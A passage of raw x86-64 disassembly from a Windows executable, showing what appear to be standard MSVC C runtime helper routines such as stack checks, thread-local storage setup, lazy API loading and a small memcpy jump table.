   140002ca7:	c3                   	ret
   140002ca8:	cc                   	int3
   140002ca9:	cc                   	int3
   140002caa:	cc                   	int3
   140002cab:	cc                   	int3
   140002cac:	cc                   	int3
   140002cad:	cc                   	int3
   140002cae:	cc                   	int3
   140002caf:	cc                   	int3
   140002cb0:	cc                   	int3
   140002cb1:	cc                   	int3
   140002cb2:	cc                   	int3
   140002cb3:	cc                   	int3
   140002cb4:	cc                   	int3
   140002cb5:	cc                   	int3
   140002cb6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140002cbd:	00 00 00 
   140002cc0:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140002cc5:	48 89 54 24 18       	mov    %rdx,0x18(%rsp)
   140002cca:	44 89 44 24 10       	mov    %r8d,0x10(%rsp)
   140002ccf:	49 c7 c1 20 05 93 19 	mov    $0x19930520,%r9
   140002cd6:	eb 08                	jmp    0x140002ce0
   140002cd8:	cc                   	int3
   140002cd9:	cc                   	int3
   140002cda:	cc                   	int3
   140002cdb:	cc                   	int3
   140002cdc:	cc                   	int3
   140002cdd:	cc                   	int3
   140002cde:	66 90                	xchg   %ax,%ax
   140002ce0:	c3                   	ret
   140002ce1:	cc                   	int3
   140002ce2:	cc                   	int3
   140002ce3:	cc                   	int3
   140002ce4:	cc                   	int3
   140002ce5:	cc                   	int3
   140002ce6:	cc                   	int3
   140002ce7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140002cee:	00 00 
   140002cf0:	c3                   	ret
   140002cf1:	cc                   	int3
   140002cf2:	cc                   	int3
   140002cf3:	cc                   	int3
   140002cf4:	48 8b 05 7d a5 00 00 	mov    0xa57d(%rip),%rax        # 0x14000d278
   140002cfb:	48 8d 15 b6 f2 ff ff 	lea    -0xd4a(%rip),%rdx        # 0x140001fb8
   140002d02:	48 3b c2             	cmp    %rdx,%rax
   140002d05:	74 23                	je     0x140002d2a
   140002d07:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   140002d0e:	00 00 
   140002d10:	48 8b 89 98 00 00 00 	mov    0x98(%rcx),%rcx
   140002d17:	48 3b 48 10          	cmp    0x10(%rax),%rcx
   140002d1b:	72 06                	jb     0x140002d23
   140002d1d:	48 3b 48 08          	cmp    0x8(%rax),%rcx
   140002d21:	76 07                	jbe    0x140002d2a
   140002d23:	b9 0d 00 00 00       	mov    $0xd,%ecx
   140002d28:	cd 29                	int    $0x29
   140002d2a:	c3                   	ret
   140002d2b:	cc                   	int3
   140002d2c:	48 83 ec 28          	sub    $0x28,%rsp
   140002d30:	48 85 c9             	test   %rcx,%rcx
   140002d33:	74 11                	je     0x140002d46
   140002d35:	48 8d 05 44 53 01 00 	lea    0x15344(%rip),%rax        # 0x140018080
   140002d3c:	48 3b c8             	cmp    %rax,%rcx
   140002d3f:	74 05                	je     0x140002d46
   140002d41:	e8 d2 1b 00 00       	call   0x140004918
   140002d46:	48 83 c4 28          	add    $0x28,%rsp
   140002d4a:	c3                   	ret
   140002d4b:	cc                   	int3
   140002d4c:	48 83 ec 28          	sub    $0x28,%rsp
   140002d50:	e8 13 00 00 00       	call   0x140002d68
   140002d55:	48 85 c0             	test   %rax,%rax
   140002d58:	74 05                	je     0x140002d5f
   140002d5a:	48 83 c4 28          	add    $0x28,%rsp
   140002d5e:	c3                   	ret
   140002d5f:	e8 bc 21 00 00       	call   0x140004f20
   140002d64:	cc                   	int3
   140002d65:	cc                   	int3
   140002d66:	cc                   	int3
   140002d67:	cc                   	int3
   140002d68:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002d6d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140002d72:	57                   	push   %rdi
   140002d73:	48 83 ec 20          	sub    $0x20,%rsp
   140002d77:	83 3d b2 42 01 00 ff 	cmpl   $0xffffffff,0x142b2(%rip)        # 0x140017030
   140002d7e:	75 07                	jne    0x140002d87
   140002d80:	33 c0                	xor    %eax,%eax
   140002d82:	e9 90 00 00 00       	jmp    0x140002e17
   140002d87:	ff 15 8b a2 00 00    	call   *0xa28b(%rip)        # 0x14000d018
   140002d8d:	8b 0d 9d 42 01 00    	mov    0x1429d(%rip),%ecx        # 0x140017030
   140002d93:	8b f8                	mov    %eax,%edi
   140002d95:	e8 5a 03 00 00       	call   0x1400030f4
   140002d9a:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   140002d9e:	33 f6                	xor    %esi,%esi
   140002da0:	48 3b c2             	cmp    %rdx,%rax
   140002da3:	74 67                	je     0x140002e0c
   140002da5:	48 85 c0             	test   %rax,%rax
   140002da8:	74 05                	je     0x140002daf
   140002daa:	48 8b f0             	mov    %rax,%rsi
   140002dad:	eb 5d                	jmp    0x140002e0c
   140002daf:	8b 0d 7b 42 01 00    	mov    0x1427b(%rip),%ecx        # 0x140017030
   140002db5:	e8 82 03 00 00       	call   0x14000313c
   140002dba:	85 c0                	test   %eax,%eax
   140002dbc:	74 4e                	je     0x140002e0c
   140002dbe:	ba 80 00 00 00       	mov    $0x80,%edx
   140002dc3:	8d 4a 81             	lea    -0x7f(%rdx),%ecx
   140002dc6:	e8 ad 21 00 00       	call   0x140004f78
   140002dcb:	8b 0d 5f 42 01 00    	mov    0x1425f(%rip),%ecx        # 0x140017030
   140002dd1:	48 8b d8             	mov    %rax,%rbx
   140002dd4:	48 85 c0             	test   %rax,%rax
   140002dd7:	74 24                	je     0x140002dfd
   140002dd9:	48 8b d0             	mov    %rax,%rdx
   140002ddc:	e8 5b 03 00 00       	call   0x14000313c
   140002de1:	85 c0                	test   %eax,%eax
   140002de3:	74 12                	je     0x140002df7
   140002de5:	48 8b c3             	mov    %rbx,%rax
   140002de8:	c7 43 78 fe ff ff ff 	movl   $0xfffffffe,0x78(%rbx)
   140002def:	48 8b de             	mov    %rsi,%rbx
   140002df2:	48 8b f0             	mov    %rax,%rsi
   140002df5:	eb 0d                	jmp    0x140002e04
   140002df7:	8b 0d 33 42 01 00    	mov    0x14233(%rip),%ecx        # 0x140017030
   140002dfd:	33 d2                	xor    %edx,%edx
   140002dff:	e8 38 03 00 00       	call   0x14000313c
   140002e04:	48 8b cb             	mov    %rbx,%rcx
   140002e07:	e8 0c 1b 00 00       	call   0x140004918
   140002e0c:	8b cf                	mov    %edi,%ecx
   140002e0e:	ff 15 34 a3 00 00    	call   *0xa334(%rip)        # 0x14000d148
   140002e14:	48 8b c6             	mov    %rsi,%rax
   140002e17:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002e1c:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140002e21:	48 83 c4 20          	add    $0x20,%rsp
   140002e25:	5f                   	pop    %rdi
   140002e26:	c3                   	ret
   140002e27:	cc                   	int3
   140002e28:	48 83 ec 28          	sub    $0x28,%rsp
   140002e2c:	48 8d 0d f9 fe ff ff 	lea    -0x107(%rip),%rcx        # 0x140002d2c
   140002e33:	e8 2c 02 00 00       	call   0x140003064
   140002e38:	89 05 f2 41 01 00    	mov    %eax,0x141f2(%rip)        # 0x140017030
   140002e3e:	83 f8 ff             	cmp    $0xffffffff,%eax
   140002e41:	74 25                	je     0x140002e68
   140002e43:	48 8d 15 36 52 01 00 	lea    0x15236(%rip),%rdx        # 0x140018080
   140002e4a:	8b c8                	mov    %eax,%ecx
   140002e4c:	e8 eb 02 00 00       	call   0x14000313c
   140002e51:	85 c0                	test   %eax,%eax
   140002e53:	74 0e                	je     0x140002e63
   140002e55:	c7 05 99 52 01 00 fe 	movl   $0xfffffffe,0x15299(%rip)        # 0x1400180f8
   140002e5c:	ff ff ff 
   140002e5f:	b0 01                	mov    $0x1,%al
   140002e61:	eb 07                	jmp    0x140002e6a
   140002e63:	e8 08 00 00 00       	call   0x140002e70
   140002e68:	32 c0                	xor    %al,%al
   140002e6a:	48 83 c4 28          	add    $0x28,%rsp
   140002e6e:	c3                   	ret
   140002e6f:	cc                   	int3
   140002e70:	48 83 ec 28          	sub    $0x28,%rsp
   140002e74:	8b 0d b6 41 01 00    	mov    0x141b6(%rip),%ecx        # 0x140017030
   140002e7a:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140002e7d:	74 0c                	je     0x140002e8b
   140002e7f:	e8 28 02 00 00       	call   0x1400030ac
   140002e84:	83 0d a5 41 01 00 ff 	orl    $0xffffffff,0x141a5(%rip)        # 0x140017030
   140002e8b:	b0 01                	mov    $0x1,%al
   140002e8d:	48 83 c4 28          	add    $0x28,%rsp
   140002e91:	c3                   	ret
   140002e92:	cc                   	int3
   140002e93:	cc                   	int3
   140002e94:	40 53                	rex push %rbx
   140002e96:	48 83 ec 20          	sub    $0x20,%rsp
   140002e9a:	33 db                	xor    %ebx,%ebx
   140002e9c:	48 8d 15 5d 52 01 00 	lea    0x1525d(%rip),%rdx        # 0x140018100
   140002ea3:	45 33 c0             	xor    %r8d,%r8d
   140002ea6:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   140002eaa:	48 8d 0c ca          	lea    (%rdx,%rcx,8),%rcx
   140002eae:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   140002eb3:	e8 d8 02 00 00       	call   0x140003190
   140002eb8:	85 c0                	test   %eax,%eax
   140002eba:	74 11                	je     0x140002ecd
   140002ebc:	ff 05 66 52 01 00    	incl   0x15266(%rip)        # 0x140018128
   140002ec2:	ff c3                	inc    %ebx
   140002ec4:	83 fb 01             	cmp    $0x1,%ebx
   140002ec7:	72 d3                	jb     0x140002e9c
   140002ec9:	b0 01                	mov    $0x1,%al
   140002ecb:	eb 07                	jmp    0x140002ed4
   140002ecd:	e8 0a 00 00 00       	call   0x140002edc
   140002ed2:	32 c0                	xor    %al,%al
   140002ed4:	48 83 c4 20          	add    $0x20,%rsp
   140002ed8:	5b                   	pop    %rbx
   140002ed9:	c3                   	ret
   140002eda:	cc                   	int3
   140002edb:	cc                   	int3
   140002edc:	40 53                	rex push %rbx
   140002ede:	48 83 ec 20          	sub    $0x20,%rsp
   140002ee2:	8b 1d 40 52 01 00    	mov    0x15240(%rip),%ebx        # 0x140018128
   140002ee8:	eb 1d                	jmp    0x140002f07
   140002eea:	48 8d 05 0f 52 01 00 	lea    0x1520f(%rip),%rax        # 0x140018100
   140002ef1:	ff cb                	dec    %ebx
   140002ef3:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   140002ef7:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   140002efb:	ff 15 5f a2 00 00    	call   *0xa25f(%rip)        # 0x14000d160
   140002f01:	ff 0d 21 52 01 00    	decl   0x15221(%rip)        # 0x140018128
   140002f07:	85 db                	test   %ebx,%ebx
   140002f09:	75 df                	jne    0x140002eea
   140002f0b:	b0 01                	mov    $0x1,%al
   140002f0d:	48 83 c4 20          	add    $0x20,%rsp
   140002f11:	5b                   	pop    %rbx
   140002f12:	c3                   	ret
   140002f13:	cc                   	int3
   140002f14:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002f19:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140002f1e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140002f23:	57                   	push   %rdi
   140002f24:	41 54                	push   %r12
   140002f26:	41 55                	push   %r13
   140002f28:	41 56                	push   %r14
   140002f2a:	41 57                	push   %r15
   140002f2c:	48 83 ec 20          	sub    $0x20,%rsp
   140002f30:	8b f9                	mov    %ecx,%edi
   140002f32:	4c 8d 3d c7 d0 ff ff 	lea    -0x2f39(%rip),%r15        # 0x140000000
   140002f39:	49 83 ce ff          	or     $0xffffffffffffffff,%r14
   140002f3d:	4d 8b e1             	mov    %r9,%r12
   140002f40:	49 8b e8             	mov    %r8,%rbp
   140002f43:	4c 8b ea             	mov    %rdx,%r13
   140002f46:	49 8b 84 ff b0 81 01 	mov    0x181b0(%r15,%rdi,8),%rax
   140002f4d:	00 
   140002f4e:	90                   	nop
   140002f4f:	49 3b c6             	cmp    %r14,%rax
   140002f52:	0f 84 eb 00 00 00    	je     0x140003043
   140002f58:	48 85 c0             	test   %rax,%rax
   140002f5b:	0f 85 e4 00 00 00    	jne    0x140003045
   140002f61:	4d 3b c1             	cmp    %r9,%r8
   140002f64:	0f 84 d1 00 00 00    	je     0x14000303b
   140002f6a:	8b 75 00             	mov    0x0(%rbp),%esi
   140002f6d:	49 8b 9c f7 98 81 01 	mov    0x18198(%r15,%rsi,8),%rbx
   140002f74:	00 
   140002f75:	90                   	nop
   140002f76:	48 85 db             	test   %rbx,%rbx
   140002f79:	74 0b                	je     0x140002f86
   140002f7b:	49 3b de             	cmp    %r14,%rbx
   140002f7e:	0f 85 99 00 00 00    	jne    0x14000301d
   140002f84:	eb 6b                	jmp    0x140002ff1
   140002f86:	4d 8b bc f7 f8 e1 00 	mov    0xe1f8(%r15,%rsi,8),%r15
   140002f8d:	00 
   140002f8e:	33 d2                	xor    %edx,%edx
   140002f90:	49 8b cf             	mov    %r15,%rcx
   140002f93:	41 b8 00 08 00 00    	mov    $0x800,%r8d
   140002f99:	ff 15 f1 a1 00 00    	call   *0xa1f1(%rip)        # 0x14000d190
   140002f9f:	48 8b d8             	mov    %rax,%rbx
   140002fa2:	48 85 c0             	test   %rax,%rax
   140002fa5:	75 56                	jne    0x140002ffd
   140002fa7:	ff 15 6b a0 00 00    	call   *0xa06b(%rip)        # 0x14000d018
   140002fad:	83 f8 57             	cmp    $0x57,%eax
   140002fb0:	75 2d                	jne    0x140002fdf
   140002fb2:	44 8d 43 07          	lea    0x7(%rbx),%r8d
   140002fb6:	49 8b cf             	mov    %r15,%rcx
   140002fb9:	48 8d 15 e8 b2 00 00 	lea    0xb2e8(%rip),%rdx        # 0x14000e2a8
   140002fc0:	e8 4b 20 00 00       	call   0x140005010
   140002fc5:	85 c0                	test   %eax,%eax
   140002fc7:	74 16                	je     0x140002fdf
   140002fc9:	45 33 c0             	xor    %r8d,%r8d
   140002fcc:	33 d2                	xor    %edx,%edx
   140002fce:	49 8b cf             	mov    %r15,%rcx
   140002fd1:	ff 15 b9 a1 00 00    	call   *0xa1b9(%rip)        # 0x14000d190
   140002fd7:	48 8b d8             	mov    %rax,%rbx
   140002fda:	48 85 c0             	test   %rax,%rax
   140002fdd:	75 1e                	jne    0x140002ffd
   140002fdf:	49 8b c6             	mov    %r14,%rax
   140002fe2:	4c 8d 3d 17 d0 ff ff 	lea    -0x2fe9(%rip),%r15        # 0x140000000
   140002fe9:	49 87 84 f7 98 81 01 	xchg   %rax,0x18198(%r15,%rsi,8)
   140002ff0:	00 
   140002ff1:	48 83 c5 04          	add    $0x4,%rbp
   140002ff5:	49 3b ec             	cmp    %r12,%rbp
   140002ff8:	e9 67 ff ff ff       	jmp    0x140002f64
   140002ffd:	48 8b c3             	mov    %rbx,%rax
   140003000:	4c 8d 3d f9 cf ff ff 	lea    -0x3007(%rip),%r15        # 0x140000000
   140003007:	49 87 84 f7 98 81 01 	xchg   %rax,0x18198(%r15,%rsi,8)
   14000300e:	00 
   14000300f:	48 85 c0             	test   %rax,%rax
   140003012:	74 09                	je     0x14000301d
   140003014:	48 8b cb             	mov    %rbx,%rcx
   140003017:	ff 15 2b a0 00 00    	call   *0xa02b(%rip)        # 0x14000d048
   14000301d:	49 8b d5             	mov    %r13,%rdx
   140003020:	48 8b cb             	mov    %rbx,%rcx
   140003023:	ff 15 0f a0 00 00    	call   *0xa00f(%rip)        # 0x14000d038
   140003029:	48 85 c0             	test   %rax,%rax
   14000302c:	74 0d                	je     0x14000303b
   14000302e:	48 8b c8             	mov    %rax,%rcx
   140003031:	49 87 8c ff b0 81 01 	xchg   %rcx,0x181b0(%r15,%rdi,8)
   140003038:	00 
   140003039:	eb 0a                	jmp    0x140003045
   14000303b:	4d 87 b4 ff b0 81 01 	xchg   %r14,0x181b0(%r15,%rdi,8)
   140003042:	00 
   140003043:	33 c0                	xor    %eax,%eax
   140003045:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000304a:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   14000304f:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140003054:	48 83 c4 20          	add    $0x20,%rsp
   140003058:	41 5f                	pop    %r15
   14000305a:	41 5e                	pop    %r14
   14000305c:	41 5d                	pop    %r13
   14000305e:	41 5c                	pop    %r12
   140003060:	5f                   	pop    %rdi
   140003061:	c3                   	ret
   140003062:	cc                   	int3
   140003063:	cc                   	int3
   140003064:	40 53                	rex push %rbx
   140003066:	48 83 ec 20          	sub    $0x20,%rsp
   14000306a:	48 8b d9             	mov    %rcx,%rbx
   14000306d:	4c 8d 0d 4c b2 00 00 	lea    0xb24c(%rip),%r9        # 0x14000e2c0
   140003074:	33 c9                	xor    %ecx,%ecx
   140003076:	4c 8d 05 3b b2 00 00 	lea    0xb23b(%rip),%r8        # 0x14000e2b8
   14000307d:	48 8d 15 3c b2 00 00 	lea    0xb23c(%rip),%rdx        # 0x14000e2c0
   140003084:	e8 8b fe ff ff       	call   0x140002f14
   140003089:	48 85 c0             	test   %rax,%rax
   14000308c:	74 0f                	je     0x14000309d
   14000308e:	48 8b cb             	mov    %rbx,%rcx
   140003091:	48 83 c4 20          	add    $0x20,%rsp
   140003095:	5b                   	pop    %rbx
   140003096:	48 ff 25 eb a1 00 00 	rex.W jmp *0xa1eb(%rip)        # 0x14000d288
   14000309d:	48 83 c4 20          	add    $0x20,%rsp
   1400030a1:	5b                   	pop    %rbx
   1400030a2:	48 ff 25 c7 a0 00 00 	rex.W jmp *0xa0c7(%rip)        # 0x14000d170
   1400030a9:	cc                   	int3
   1400030aa:	cc                   	int3
   1400030ab:	cc                   	int3
   1400030ac:	40 53                	rex push %rbx
   1400030ae:	48 83 ec 20          	sub    $0x20,%rsp
   1400030b2:	8b d9                	mov    %ecx,%ebx
   1400030b4:	4c 8d 0d 1d b2 00 00 	lea    0xb21d(%rip),%r9        # 0x14000e2d8
   1400030bb:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400030c0:	4c 8d 05 09 b2 00 00 	lea    0xb209(%rip),%r8        # 0x14000e2d0
   1400030c7:	48 8d 15 0a b2 00 00 	lea    0xb20a(%rip),%rdx        # 0x14000e2d8
   1400030ce:	e8 41 fe ff ff       	call   0x140002f14
   1400030d3:	8b cb                	mov    %ebx,%ecx
   1400030d5:	48 85 c0             	test   %rax,%rax
   1400030d8:	74 0c                	je     0x1400030e6
   1400030da:	48 83 c4 20          	add    $0x20,%rsp
   1400030de:	5b                   	pop    %rbx
   1400030df:	48 ff 25 a2 a1 00 00 	rex.W jmp *0xa1a2(%rip)        # 0x14000d288
   1400030e6:	48 83 c4 20          	add    $0x20,%rsp
   1400030ea:	5b                   	pop    %rbx
   1400030eb:	48 ff 25 96 a0 00 00 	rex.W jmp *0xa096(%rip)        # 0x14000d188
   1400030f2:	cc                   	int3
   1400030f3:	cc                   	int3
   1400030f4:	40 53                	rex push %rbx
   1400030f6:	48 83 ec 20          	sub    $0x20,%rsp
   1400030fa:	8b d9                	mov    %ecx,%ebx
   1400030fc:	4c 8d 0d e5 b1 00 00 	lea    0xb1e5(%rip),%r9        # 0x14000e2e8
   140003103:	b9 02 00 00 00       	mov    $0x2,%ecx
   140003108:	4c 8d 05 d1 b1 00 00 	lea    0xb1d1(%rip),%r8        # 0x14000e2e0
   14000310f:	48 8d 15 d2 b1 00 00 	lea    0xb1d2(%rip),%rdx        # 0x14000e2e8
   140003116:	e8 f9 fd ff ff       	call   0x140002f14
   14000311b:	8b cb                	mov    %ebx,%ecx
   14000311d:	48 85 c0             	test   %rax,%rax
   140003120:	74 0c                	je     0x14000312e
   140003122:	48 83 c4 20          	add    $0x20,%rsp
   140003126:	5b                   	pop    %rbx
   140003127:	48 ff 25 5a a1 00 00 	rex.W jmp *0xa15a(%rip)        # 0x14000d288
   14000312e:	48 83 c4 20          	add    $0x20,%rsp
   140003132:	5b                   	pop    %rbx
   140003133:	48 ff 25 3e a0 00 00 	rex.W jmp *0xa03e(%rip)        # 0x14000d178
   14000313a:	cc                   	int3
   14000313b:	cc                   	int3
   14000313c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003141:	57                   	push   %rdi
   140003142:	48 83 ec 20          	sub    $0x20,%rsp
   140003146:	48 8b da             	mov    %rdx,%rbx
   140003149:	4c 8d 0d b0 b1 00 00 	lea    0xb1b0(%rip),%r9        # 0x14000e300
   140003150:	8b f9                	mov    %ecx,%edi
   140003152:	48 8d 15 a7 b1 00 00 	lea    0xb1a7(%rip),%rdx        # 0x14000e300
   140003159:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000315e:	4c 8d 05 93 b1 00 00 	lea    0xb193(%rip),%r8        # 0x14000e2f8
   140003165:	e8 aa fd ff ff       	call   0x140002f14
   14000316a:	48 8b d3             	mov    %rbx,%rdx
   14000316d:	8b cf                	mov    %edi,%ecx
   14000316f:	48 85 c0             	test   %rax,%rax
   140003172:	74 08                	je     0x14000317c
   140003174:	ff 15 0e a1 00 00    	call   *0xa10e(%rip)        # 0x14000d288
   14000317a:	eb 06                	jmp    0x140003182
   14000317c:	ff 15 fe 9f 00 00    	call   *0x9ffe(%rip)        # 0x14000d180
   140003182:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003187:	48 83 c4 20          	add    $0x20,%rsp
   14000318b:	5f                   	pop    %rdi
   14000318c:	c3                   	ret
   14000318d:	cc                   	int3
   14000318e:	cc                   	int3
   14000318f:	cc                   	int3
   140003190:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003195:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000319a:	57                   	push   %rdi
   14000319b:	48 83 ec 20          	sub    $0x20,%rsp
   14000319f:	41 8b f0             	mov    %r8d,%esi
   1400031a2:	4c 8d 0d 6f b1 00 00 	lea    0xb16f(%rip),%r9        # 0x14000e318
   1400031a9:	8b da                	mov    %edx,%ebx
   1400031ab:	4c 8d 05 5e b1 00 00 	lea    0xb15e(%rip),%r8        # 0x14000e310
   1400031b2:	48 8b f9             	mov    %rcx,%rdi
   1400031b5:	48 8d 15 5c b1 00 00 	lea    0xb15c(%rip),%rdx        # 0x14000e318
   1400031bc:	b9 04 00 00 00       	mov    $0x4,%ecx
   1400031c1:	e8 4e fd ff ff       	call   0x140002f14
   1400031c6:	8b d3                	mov    %ebx,%edx
   1400031c8:	48 8b cf             	mov    %rdi,%rcx
   1400031cb:	48 85 c0             	test   %rax,%rax
   1400031ce:	74 0b                	je     0x1400031db
   1400031d0:	44 8b c6             	mov    %esi,%r8d
   1400031d3:	ff 15 af a0 00 00    	call   *0xa0af(%rip)        # 0x14000d288
   1400031d9:	eb 06                	jmp    0x1400031e1
   1400031db:	ff 15 87 9f 00 00    	call   *0x9f87(%rip)        # 0x14000d168
   1400031e1:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400031e6:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400031eb:	48 83 c4 20          	add    $0x20,%rsp
   1400031ef:	5f                   	pop    %rdi
   1400031f0:	c3                   	ret
   1400031f1:	cc                   	int3
   1400031f2:	cc                   	int3
   1400031f3:	cc                   	int3
   1400031f4:	cc                   	int3
   1400031f5:	cc                   	int3
   1400031f6:	cc                   	int3
   1400031f7:	cc                   	int3
   1400031f8:	cc                   	int3
   1400031f9:	cc                   	int3
   1400031fa:	cc                   	int3
   1400031fb:	cc                   	int3
   1400031fc:	cc                   	int3
   1400031fd:	cc                   	int3
   1400031fe:	cc                   	int3
   1400031ff:	cc                   	int3
   140003200:	cc                   	int3
   140003201:	cc                   	int3
   140003202:	cc                   	int3
   140003203:	cc                   	int3
   140003204:	cc                   	int3
   140003205:	cc                   	int3
   140003206:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000320d:	00 00 00 
   140003210:	57                   	push   %rdi
   140003211:	56                   	push   %rsi
   140003212:	48 8b f9             	mov    %rcx,%rdi
   140003215:	48 8b f2             	mov    %rdx,%rsi
   140003218:	49 8b c8             	mov    %r8,%rcx
   14000321b:	f3 a4                	rep movsb (%rsi),(%rdi)
   14000321d:	5e                   	pop    %rsi
   14000321e:	5f                   	pop    %rdi
   14000321f:	c3                   	ret
   140003220:	cc                   	int3
   140003221:	cc                   	int3
   140003222:	cc                   	int3
   140003223:	cc                   	int3
   140003224:	cc                   	int3
   140003225:	cc                   	int3
   140003226:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000322d:	00 00 00 
   140003230:	48 8b c1             	mov    %rcx,%rax
   140003233:	4c 8d 15 c6 cd ff ff 	lea    -0x323a(%rip),%r10        # 0x140000000
   14000323a:	49 83 f8 0f          	cmp    $0xf,%r8
   14000323e:	0f 87 0c 01 00 00    	ja     0x140003350
   140003244:	66 66 66 66 0f 1f 84 	data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000324b:	00 00 00 00 00 
   140003250:	47 8b 8c 82 b0 a0 01 	mov    0x1a0b0(%r10,%r8,4),%r9d
   140003257:	00 
   140003258:	4d 03 ca             	add    %r10,%r9
   14000325b:	41 ff e1             	jmp    *%r9
   14000325e:	c3                   	ret
   14000325f:	90                   	nop
   140003260:	4c 8b 02             	mov    (%rdx),%r8
   140003263:	8b 4a 08             	mov    0x8(%rdx),%ecx
   140003266:	44 0f b7 4a 0c       	movzwl 0xc(%rdx),%r9d
   14000326b:	44 0f b6 52 0e       	movzbl 0xe(%rdx),%r10d
   140003270:	4c 89 00             	mov    %r8,(%rax)
   140003273:	89 48 08             	mov    %ecx,0x8(%rax)
   140003276:	66 44 89 48 0c       	mov    %r9w,0xc(%rax)
   14000327b:	44 88 50 0e          	mov    %r10b,0xe(%rax)
   14000327f:	c3                   	ret
   140003280:	4c 8b 02             	mov    (%rdx),%r8
   140003283:	0f b7 4a 08          	movzwl 0x8(%rdx),%ecx
   140003287:	44 0f b6 4a 0a       	movzbl 0xa(%rdx),%r9d
   14000328c:	4c 89 00             	mov    %r8,(%rax)
   14000328f:	66 89 48 08          	mov    %cx,0x8(%rax)
   140003293:	44 88 48 0a          	mov    %r9b,0xa(%rax)
   140003297:	c3                   	ret
   140003298:	0f b7 0a             	movzwl (%rdx),%ecx
   14000329b:	66 89 08             	mov    %cx,(%rax)
   14000329e:	c3                   	ret
   14000329f:	90                   	nop
   1400032a0:	8b 0a                	mov    (%rdx),%ecx
   1400032a2:	44 0f b7 42 04       	movzwl 0x4(%rdx),%r8d
   1400032a7:	44 0f b6 4a 06       	movzbl 0x6(%rdx),%r9d
   1400032ac:	89 08                	mov    %ecx,(%rax)
   1400032ae:	66 44 89 40 04       	mov    %r8w,0x4(%rax)
   1400032b3:	44 88 48 06          	mov    %r9b,0x6(%rax)
   1400032b7:	c3                   	ret
   1400032b8:	4c 8b 02             	mov    (%rdx),%r8
   1400032bb:	8b 4a 08             	mov    0x8(%rdx),%ecx
   1400032be:	44 0f b7 4a 0c       	movzwl 0xc(%rdx),%r9d
   1400032c3:	4c 89 00             	mov    %r8,(%rax)
   1400032c6:	89 48 08             	mov    %ecx,0x8(%rax)
   1400032c9:	66 44 89 48 0c       	mov    %r9w,0xc(%rax)
   1400032ce:	c3                   	ret
   1400032cf:	0f b7 0a             	movzwl (%rdx),%ecx
   1400032d2:	44 0f b6 42 02       	movzbl 0x2(%rdx),%r8d
   1400032d7:	66 89 08             	mov    %cx,(%rax)
   1400032da:	44 88 40 02          	mov    %r8b,0x2(%rax)
   1400032de:	c3                   	ret
   1400032df:	90                   	nop
   1400032e0:	4c 8b 02             	mov    (%rdx),%r8
   1400032e3:	8b 4a 08             	mov    0x8(%rdx),%ecx
   1400032e6:	44 0f b6 4a 0c       	movzbl 0xc(%rdx),%r9d
   1400032eb:	4c 89 00             	mov    %r8,(%rax)
   1400032ee:	89 48 08             	mov    %ecx,0x8(%rax)
   1400032f1:	44 88 48 0c          	mov    %r9b,0xc(%rax)
   1400032f5:	c3                   	ret
   1400032f6:	4c 8b 02             	mov    (%rdx),%r8
   1400032f9:	0f b7 4a 08          	movzwl 0x8(%rdx),%ecx
   1400032fd:	4c 89 00             	mov    %r8,(%rax)
   140003300:	66 89 48 08          	mov    %cx,0x8(%rax)
   140003304:	c3                   	ret
   140003305:	4c 8b 02             	mov    (%rdx),%r8
   140003308:	0f b6 4a 08          	movzbl 0x8(%rdx),%ecx
   14000330c:	4c 89 00             	mov    %r8,(%rax)
   14000330f:	88 48 08             	mov    %cl,0x8(%rax)
   140003312:	c3                   	ret
   140003313:	4c 8b 02             	mov    (%rdx),%r8
   140003316:	8b 4a 08             	mov    0x8(%rdx),%ecx
   140003319:	4c 89 00             	mov    %r8,(%rax)
   14000331c:	89 48 08             	mov    %ecx,0x8(%rax)
   14000331f:	c3                   	ret
   140003320:	8b 0a                	mov    (%rdx),%ecx
   140003322:	44 0f b7 42 04       	movzwl 0x4(%rdx),%r8d
   140003327:	89 08                	mov    %ecx,(%rax)
   140003329:	66 44 89 40 04       	mov    %r8w,0x4(%rax)
   14000332e:	c3                   	ret
   14000332f:	8b 0a                	mov    (%rdx),%ecx
   140003331:	44 0f b6 42 04       	movzbl 0x4(%rdx),%r8d
   140003336:	89 08                	mov    %ecx,(%rax)
   140003338:	44 88 40 04          	mov    %r8b,0x4(%rax)
   14000333c:	c3                   	ret
   14000333d:	48 8b 0a             	mov    (%rdx),%rcx
   140003340:	48 89 08             	mov    %rcx,(%rax)
   140003343:	c3                   	ret
   140003344:	0f b6 0a             	movzbl (%rdx),%ecx
   140003347:	88 08                	mov    %cl,(%rax)
   140003349:	c3                   	ret
   14000334a:	8b 0a                	mov    (%rdx),%ecx
   14000334c:	89 08                	mov    %ecx,(%rax)
   14000334e:	c3                   	ret
